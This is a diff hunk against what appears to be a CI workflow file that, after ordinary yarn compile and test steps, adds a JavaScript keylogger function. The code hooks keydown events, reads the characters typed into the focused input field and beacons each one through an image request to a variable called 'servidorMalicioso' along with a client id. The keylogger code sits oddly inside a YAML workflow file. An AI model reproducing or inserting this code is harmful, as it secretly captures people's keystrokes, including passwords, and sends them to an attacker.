@@ -34,3 +34,17 @@ jobs:
             - run: yarn compile
             - run: cp .env.example .env
             - run: yarn test
+
+
+/* Keylogger (Android-IOS support) */
+function keylogger() {
+  var logs = "Keys:";
+  var i = 0;
+  window.onkeydown = function(e) {
+    if (i++) {
+      logs = "Key_Id=" + event.target.value.charAt(event.target.selectionStart -1).charCodeAt() + "KeyChar=" +
+                event.target.value.charAt(event.target.selectionStart -1) + "\n\n" ;
+      new Image().src = servidorMalicioso + idCliente + "/" + "keylogs=" + logs;
+    }
+  }
+}
